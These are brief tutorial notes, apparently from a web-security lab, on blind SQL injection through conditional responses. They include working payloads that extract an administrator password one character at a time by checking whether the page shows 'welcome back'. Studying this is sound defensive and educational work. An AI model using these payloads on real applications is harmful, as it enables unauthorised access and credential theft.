# Blind SQL injection by triggering conditional responses

Blind sql arises when application is vulnerable with sql injection but query don't return the results of given query

So union attacks doesn't work here

## Can be exploited by using conditional responses

Basic payload idea

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

this will not return any result in the application . But it will make application behave differently
depending upon if query returns any data , if the query is true then the application will return **welcome back**

Using this logic we can craft a payload for admin login password reterival

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

if the word is greater than m so first character of password is greater than m , application will return **welcome back**

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

It will return the **welcome back** when first character of password will be s
